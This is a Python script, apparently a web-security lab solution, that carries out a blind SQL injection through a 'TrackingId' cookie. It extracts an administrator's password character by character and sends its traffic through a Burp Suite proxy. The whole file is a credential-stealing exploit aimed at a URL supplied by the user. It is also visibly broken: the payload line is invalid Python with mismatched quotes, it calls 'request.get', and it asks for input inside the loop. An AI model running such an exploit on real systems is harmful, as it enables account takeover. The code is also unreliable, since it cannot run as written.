import os
import sys
import urllib3
import requests #This will allow you to make http or https request
import urllib.parse
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#setting your proxy to burpsuite proxy to enable traffic to pass through the burpsuite proxy then to the web allowing viewing of traffic at burpsuite application
proxies = {'http':'http://127.0.0.1:8080' , 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
    password_cracked = ""
    for i in range(1,21):
        for j in range(32,126):
            #session id
            sqli_payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username=" + input("enter the website administrsator username")='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload) #url encoding
            cookies = {'TrackingId' : input("copy paste your Tracking cookie Id ") + sqli_payload_encoded, 'session': input("copy paste your session cookie")}
            r = request.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "welcome" not in r.text:
                sys.stdout.write('\r' + password_cracked + chr(j))
                sys.stdout.flush()
            else:
                password_cracked += chr(j)
                sys.stdout.write('\r' + password_cracked)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)



if __name__=="__main__":
    main()
         
 